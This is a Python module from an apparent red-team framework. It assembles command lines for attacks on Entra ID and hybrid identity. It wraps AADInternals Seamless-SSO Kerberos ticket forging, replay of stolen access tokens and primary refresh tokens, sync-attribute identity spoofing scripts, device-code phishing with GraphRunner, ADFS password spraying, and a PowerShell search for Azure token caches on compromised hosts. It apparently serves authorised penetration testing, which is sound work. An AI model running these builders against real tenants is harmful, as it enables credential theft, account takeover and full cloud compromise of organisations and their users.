"""Typed builders for Entra ID / hybrid identity operations (Phase 9.2).

Flag discipline (Phase 7/8 rule: no invented flags). Every argv here was
cross-checked against upstream documentation, 2026-10:

* ``az rest`` / ``az login`` / ``az account show`` — Microsoft Learn Azure CLI
  reference (GA). ``az rest`` auto-attaches ``Authorization: Bearer`` from the
  signed-in credential; ``--method`` defaults to ``get``; ``--headers`` takes
  ``KEY=VALUE`` pairs; ``--url-parameters`` takes query parameters.
* ``azurehound`` v2 (SpecterOps BloodHound CE README + collection docs) — the
  ``list [object]`` subcommand FIRST, then the auth/tenant/output flags
  (``azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o out.json``);
  ``--jwt``/``-j`` and ``-r`` take pre-acquired tokens; there is **no**
  ``--az-cli-auth`` flag (the documented CLI-auth path is
  ``az account get-access-token`` piped into ``--jwt``).
* ``roadrecon`` (ROADtools wiki) — ``auth``: ``-u/-p/-t`` plus ``--device-code``,
  ``--access-token``, ``--refresh-token``, ``--prt``, ``--prt-sessionkey``; it
  writes ``.roadtools_auth``. ``gather``: ``-f <auth file>`` (default
  ``.roadtools_auth``) and ``--mfa``; stores into ``roadrecon.db``.
* ``New-AADIntKerberosTicket`` (AADInternals reference) — Seamless-SSO /
  cloud-Kerberos ticket forging. Parameters: ``-SidString`` (or ``-Sid`` /
  ``-ADUserPrincipalName`` / ``-AADUserPrincipalName`` + ``-AccessToken``) and
  ``-Password`` (AZUREADSSOACC$ password) or ``-Hash`` (its NTLM hash).
* ``New-AADIntUserPRTToken`` (AADInternals reference) — PRT token: ``-RefreshToken``
  ``-SessionKey`` ``-GetNonce``.
* ADFS spraying has no canonical tool (verified: multiple community forks), so
  ``adfs_spray`` is a raw-args shim — same precedent as the ESC17 shim: the
  graph author passes the exact argv for the script they deployed.
"""

from __future__ import annotations

from pydantic import SecretStr

from redstrike.builders._auth import secret_value


def _ps_quote(value: str) -> str:
    """Single-quote a PowerShell literal (internal quotes doubled)."""
    return "'" + value.replace("'", "''") + "'"


def _powershell(command: str, *, shell: str = "powershell") -> list[str]:
    return [shell, "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command]


class EntraBuilder:
    """Typed builder for Entra ID / hybrid identity tooling."""

    def __init__(self, binary: str = "az") -> None:
        self.binary = binary

    # ------------------------------------------------------------------ az
    def az_login_service_principal(
        self,
        *,
        app_id: str,
        secret: str | SecretStr,
        tenant: str,
        allow_no_subscriptions: bool = True,
    ) -> list[str]:
        """Service-principal sign-in (flags per Microsoft Learn `az login`).

        ``--allow-no-subscriptions`` supports tenant-level-only work (``az ad``,
        Graph) without an Azure subscription.
        """
        argv = [
            self.binary,
            "login",
            "--service-principal",
            "--username",
            app_id,
            "--password",
            secret_value(secret) or "",
            "--tenant",
            tenant,
        ]
        if allow_no_subscriptions:
            argv.append("--allow-no-subscriptions")
        return argv

    def az_account_show(self, *, query: str = "tenantId", binary: str | None = None) -> list[str]:
        """`az account show` — the 9.3 structured verification probe."""
        return [binary or self.binary, "account", "show", "--query", query, "-o", "json"]

    def az_account_list(
        self,
        *,
        all_subscriptions: bool = False,
        query: str | None = None,
        binary: str | None = None,
    ) -> list[str]:
        """`az account list [--all]` — subscription landscape (HackTricks whoami set)."""
        argv = [binary or self.binary, "account", "list", "-o", "json"]
        if all_subscriptions:
            argv.insert(3, "--all")
        if query:
            argv.extend(["--query", query])
        return argv

    def az_signed_in_user(
        self,
        *,
        query: str | None = None,
        binary: str | None = None,
    ) -> list[str]:
        """`az ad signed-in-user show` — current identity (flags live-verified)."""
        argv = [binary or self.binary, "ad", "signed-in-user", "show"]
        if query:
            argv.extend(["--query", query])
        return argv

    def az_role_assignment_list(
        self,
        *,
        assignee: str | None = None,
        all_assignments: bool = True,
        role: str | None = None,
        scope: str | None = None,
        query: str | None = None,
        binary: str | None = None,
    ) -> list[str]:
        """`az role assignment list` — Azure RBAC reach (HackTricks attestation set)."""
        argv = [binary or self.binary, "role", "assignment", "list", "-o", "json"]
        if all_assignments:
            argv.append("--all")
        if assignee:
            argv.extend(["--assignee", assignee])
        if role:
            argv.extend(["--role", role])
        if scope:
            argv.extend(["--scope", scope])
        if query:
            argv.extend(["--query", query])
        return argv

    #: Token/credential caches documented by HackTricks' Azure post-exploitation
    #: notes (files an operator collects from a compromised workstation).
    TOKEN_ARTIFACT_NAMES = (
        "msal_token_cache.json",
        "msal_http_cache.bin",
        "service_principal_entries.json",
        "AzureRmContext.json",
        "az-context.json",
    )

    def token_artifacts(
        self,
        *,
        root: str,
        names: tuple[str, ...] | None = None,
        shell: str = "powershell",
    ) -> list[str]:
        """Locate Azure/MSAL token caches under an operator-supplied root.

        Filenames follow HackTricks' Azure post-exploitation notes (MSAL cache,
        AzureRm/Az contexts). Only the collection primitive is fixed here —
        the search ROOT is operator-supplied, because token-cache locations
        vary by tool version and profile; pass e.g. the user profile or
        `.azure` directory. Retrieved files contain access/ID tokens: the
        ledger stores them as `cred_type: token` and derived output is
        scrubbed (JWT/bearer patterns).
        """
        name_list = names or self.TOKEN_ARTIFACT_NAMES
        quoted = ", ".join(_ps_quote(name) for name in name_list)
        command = (
            f"Get-ChildItem -Path {_ps_quote(root)} -Recurse -Force "
            f"-ErrorAction SilentlyContinue | "
            f"Where-Object {{ $_.Name -in @({quoted}) }} | "
            f"Select-Object -ExpandProperty FullName"
        )
        return _powershell(command, shell=shell)

    def graph_query(
        self,
        *,
        url: str,
        method: str = "get",
        headers: dict[str, str] | None = None,
        query: str | None = None,
        body: str | None = None,
        binary: str | None = None,
    ) -> list[str]:
        """Microsoft Graph (or ARM) call via ``az rest`` — GA flags only.

        ``url`` may be a full Graph URL (token derived from it) or an ARM
        resource path; ``--resource`` is intentionally not exposed here (the URL
        form covers the Graph use-case and avoids inventing resource strings).
        """
        allowed_methods = {"delete", "get", "head", "options", "patch", "post", "put"}
        method = method.lower()
        if method not in allowed_methods:
            raise ValueError(f"az rest --method must be one of {sorted(allowed_methods)}")
        argv = [binary or self.binary, "rest", "--method", method, "--url", url]
        if headers:
            joined = " ".join(f"{key}={value}" for key, value in headers.items())
            argv.extend(["--headers", joined])
        if body is not None:
            argv.extend(["--body", body])
        if query:
            argv.extend(["--query", query])
        return argv

    # ------------------------------------------------------------- AzureHound
    def azurehound_collect(
        self,
        *,
        username: str,
        password: str | SecretStr,
        tenant: str,
        output: str,
        object_type: str | None = None,
        binary: str = "azurehound",
    ) -> list[str]:
        """AzureHound v2 collection: ``list [object] -u -p -t -o``.

        Flag placement verified against the upstream README quickstart
        (``azurehound list -u "$USERNAME" -p "$PASSWORD" -t "$TENANT" -o
        "mytenant.json"``) and the BloodHound CE docs page — the auth/tenant
        flags belong AFTER the ``list`` subcommand. ``object_type`` is data
        (users, groups, apps, service_principals, …); omit it to collect the
        whole tenant. ``-o`` is required for BloodHound import.
        """
        argv = [binary, "list"]
        if object_type:
            argv.append(object_type)
        argv.extend(["-u", username, "-p", secret_value(password) or "", "-t", tenant, "-o", output])
        return argv

    def azurehound_collect_jwt(
        self,
        *,
        jwt: str | SecretStr,
        output: str,
        object_type: str | None = None,
        binary: str = "azurehound",
    ) -> list[str]:
        """AzureHound with a pre-acquired token (documented CLI-auth path).

        README form: acquire via ``az account get-access-token --resource
        https://graph.microsoft.com`` then ``azurehound list --jwt "$JWT"``.
        There is no ``--az-cli-auth`` flag (verified against the upstream
        README 2026-10). Append ``-o`` for file export.
        """
        argv = [binary, "list"]
        if object_type:
            argv.append(object_type)
        argv.extend(["--jwt", secret_value(jwt) or "", "-o", output])
        return argv

    def user_role_enum(
        self,
        *,
        username: str,
        password: str | SecretStr,
        tenant: str,
        output: str,
        binary: str = "azurehound",
    ) -> list[str]:
        """Collect users + their role/membership edges via AzureHound (v2).

        Entra directory-role relationships ride on the user objects in the
        BloodHound collection, so `list users` is the role-enumeration step;
        analyze the resulting JSON with BloodHound (or `entra.graph_query`).
        """
        return self.azurehound_collect(
            username=username,
            password=password,
            tenant=tenant,
            output=output,
            object_type="users",
            binary=binary,
        )

    # -------------------------------------------------------------- ROADtools
    def roadrecon_auth(
        self,
        *,
        username: str,
        password: str | SecretStr,
        tenant: str,
        binary: str = "roadrecon",
    ) -> list[str]:
        """``roadrecon auth -u -p -t`` — writes ``.roadtools_auth`` for gather."""
        return [
            binary,
            "auth",
            "-u",
            username,
            "-p",
            secret_value(password) or "",
            "-t",
            tenant,
        ]

    def roadrecon_auth_device_code(
        self,
        *,
        client_id: str | None = None,
        binary: str = "roadrecon",
    ) -> list[str]:
        """``roadrecon auth [-c <client-id>] --device-code`` — MFA-capable flow.

        Documented form: ROADtools wiki + the CARTP 2025 lab manual
        (`roadrecon auth -c 1950a258-227b-4e31-a9cf-717495945fc2 --device-code`,
        which uses the 'Microsoft Azure PowerShell' client id).
        """
        argv = [binary, "auth"]
        if client_id:
            argv.extend(["-c", client_id])
        argv.append("--device-code")
        return argv

    def roadrecon_auth_token(
        self,
        *,
        access_token: str | SecretStr,
        binary: str = "roadrecon",
    ) -> list[str]:
        """``roadrecon auth --access-token`` — replay a stolen/forged JWT."""
        return [binary, "auth", "--access-token", secret_value(access_token) or ""]

    def roadrecon_auth_prt(
        self,
        *,
        prt: str | SecretStr,
        session_key: str | SecretStr,
        binary: str = "roadrecon",
    ) -> list[str]:
        """``roadrecon auth --prt --prt-sessionkey`` — PRT-based sign-in."""
        return [
            binary,
            "auth",
            "--prt",
            secret_value(prt) or "",
            "--prt-sessionkey",
            secret_value(session_key) or "",
        ]

    def roadrecon_gather(
        self,
        *,
        auth_file: str | None = None,
        mfa: bool = False,
        binary: str = "roadrecon",
    ) -> list[str]:
        """``roadrecon gather`` — writes roadrecon.db (``--mfa`` adds auth methods)."""
        argv = [binary, "gather"]
        if auth_file:
            argv.extend(["-f", auth_file])
        if mfa:
            argv.append("--mfa")
        return argv

    # ------------------------------------------------- roadtx (hybrid flows)
    # Commands verified against the HackTricks cloud-Kerberos-trust page
    # (which mirrors dirkjanm's research tooling), 2026-10.
    def roadtx_gettokens(
        self,
        *,
        username: str,
        password: str | SecretStr,
        resource: str = "aadgraph",
        binary: str = "roadtx",
    ) -> list[str]:
        """``roadtx gettokens -u -p -r <resource>`` — token for the legacy
        AAD Graph sync API (``-r aadgraph``), used to drive hybrid changes."""
        return [
            binary,
            "gettokens",
            "-u",
            username,
            "-p",
            secret_value(password) or "",
            "-r",
            resource,
        ]

    def roadtx_prt(
        self,
        *,
        username: str,
        password: str | SecretStr,
        key_pem: str,
        cert_pem: str,
        binary: str = "roadtx",
    ) -> list[str]:
        """``roadtx prt -u -p --key-pem --cert-pem`` — acquire a PRT with the
        Windows Hello device key/cert pair (cloud-Kerberos-trust chain step)."""
        return [
            binary,
            "prt",
            "-u",
            username,
            "-p",
            secret_value(password) or "",
            "--key-pem",
            key_pem,
            "--cert-pem",
            cert_pem,
        ]

    def hybrid_script(
        self,
        *,
        args: tuple[str, ...] = (),
        binary: str = "modifyuser.py",
    ) -> list[str]:
        """Operator-pinned hybrid-attack script shim (no canonical packaging).

        dirkjanm's cloud-Kerberos-trust research ships standalone scripts, not
        a package — so no flags are invented here. Verified invocation shapes
        to pass via ``args``:

        * sync-attribute modification (set the spoofed on-prem identity):
          ``modifyuser.py -a <ImmutableID> -sid <TargetAD_SID> -sam <TargetSAM>``
        * partial→full TGT exchange:
          ``partialtofulltgt.py <AD_DOMAIN>/<TargetSAM> -f roadtx.prt``

        Set ``binary`` accordingly for the second script.
        """
        return [binary, *args]

    # ------------------------------------------------------------ AADInternals
    def seamless_sso_ticket(
        self,
        *,
        sid_string: str | None = None,
        ad_upn: str | None = None,
        aad_upn: str | None = None,
        access_token: str | SecretStr | None = None,
        password: str | SecretStr | None = None,
        nt_hash: str | SecretStr | None = None,
        shell: str = "powershell",
    ) -> list[str]:
        """Forge a Seamless-SSO Kerberos ticket for a user's SID.

        ``New-AADIntKerberosTicket`` (AADInternals): supply ``-SidString``
        directly, or an on-prem ``-ADUserPrincipalName`` / cloud
        ``-AADUserPrincipalName`` (+ ``-AccessToken`` for the AAD lookup). Key
        material is the AZUREADSSOACC$ computer account: ``-Password`` or
        ``-Hash`` (NTLM). High-risk (cloud takeover) — HITL-gated upstream.
        """
        selector: list[str] = []
        if sid_string:
            selector = ["-SidString", _ps_quote(sid_string)]
        elif ad_upn:
            selector = ["-ADUserPrincipalName", _ps_quote(ad_upn)]
        elif aad_upn:
            token = secret_value(access_token)
            if not token:
                raise ValueError("aad_upn lookup requires access_token")
            selector = [
                "-AADUserPrincipalName",
                _ps_quote(aad_upn),
                "-AccessToken",
                _ps_quote(token),
            ]
        else:
            raise ValueError("seamless_sso_ticket requires sid_string, ad_upn, or aad_upn")

        key_material = secret_value(password)
        key_hash = secret_value(nt_hash)
        if key_hash:
            key_args = ["-Hash", _ps_quote(key_hash)]
        elif key_material:
            key_args = ["-Password", _ps_quote(key_material)]
        else:
            raise ValueError("seamless_sso_ticket requires the AZUREADSSOACC$ password or NTLM hash")

        command = "Import-Module AADInternals; New-AADIntKerberosTicket " + " ".join(
            [*selector, *key_args]
        )
        return _powershell(command, shell=shell)

    def prt_token(
        self,
        *,
        refresh_token: str | SecretStr,
        session_key: str | SecretStr,
        get_nonce: bool = True,
        shell: str = "powershell",
    ) -> list[str]:
        """``New-AADIntUserPRTToken -RefreshToken -SessionKey [-GetNonce]``."""
        token = secret_value(refresh_token) or ""
        key = secret_value(session_key) or ""
        command = (
            "Import-Module AADInternals; New-AADIntUserPRTToken "
            f"-RefreshToken {_ps_quote(token)} -SessionKey {_ps_quote(key)}"
        )
        if get_nonce:
            command += " -GetNonce"
        return _powershell(command, shell=shell)

    # ------------------------------------------------------------ course tools
    # Invocations follow the CARTP/CARTE 2025 lab manuals (AlteredSecurity)
    # verbatim; only the parameters those labs demonstrate are exposed.
    def monkey365(
        self,
        *,
        module_path: str,
        instance: str = "Azure",
        export_to: str = "HTML",
        collect: str = "All",
        include_entraid: bool = True,
        force_auth: bool = False,
        shell: str = "powershell",
    ) -> list[str]:
        """Monkey365 Entra/Azure assessment (CARTP lab manual, LO7).

        Lab form: ``Import-Module C:\\AzAD\\Tools\\monkey365\\monkey365.psd1
        -Verbose`` + ``Invoke-Monkey365 -IncludeEntraID -ExportTo HTML -Instance
        Azure -ForceAuth -Collect All``. ``-ForceAuth`` opens a credential
        prompt (interactive, MFA-capable). Other upstream parameters exist —
        check the project README before adding any.
        """
        command = f"Import-Module {_ps_quote(module_path)} -Verbose; Invoke-Monkey365"
        if include_entraid:
            command += " -IncludeEntraID"
        command += f" -ExportTo {_ps_quote(export_to)} -Instance {_ps_quote(instance)}"
        if force_auth:
            command += " -ForceAuth"
        command += f" -Collect {_ps_quote(collect)}"
        return _powershell(command, shell=shell)

    def graphrunner(
        self,
        *,
        module_path: str,
        action: str = "Get-GraphTokens",
        shell: str = "powershell",
    ) -> list[str]:
        """GraphRunner module entry points (CARTE lab manual, device-code phishing).

        Documented actions: ``Get-GraphTokens`` (device-code token capture),
        ``Invoke-GraphRecon`` (device code + tenant enumeration), and
        ``List-GraphRunnerModules`` (banner text). Invoke every other cmdlet
        only with its flags verified against the GraphRunner wiki.
        """
        allowed = {"Get-GraphTokens", "Invoke-GraphRecon", "List-GraphRunnerModules"}
        if action not in allowed:
            raise ValueError(f"GraphRunner action must be one of {sorted(allowed)}")
        command = f"Import-Module {_ps_quote(module_path)}; {action}"
        return _powershell(command, shell=shell)

    # ------------------------------------------------------------- ADFS spray
    def adfs_spray(self, *, args: tuple[str, ...] = (), binary: str = "ADFSpray.py") -> list[str]:
        """Operator-pinned ADFS spray shim (no canonical tool exists).

        Verified 2026-10: community forks differ (xFreed0m/ADFSpray,
        Mr-Un1k0d3r/RedTeamScripts adfs-spray.py, dunderhay/adfspray), so this
        builder does not invent flags — pass the exact argv for the script you
        deployed via ``args``.
        """
        return [binary, *args]
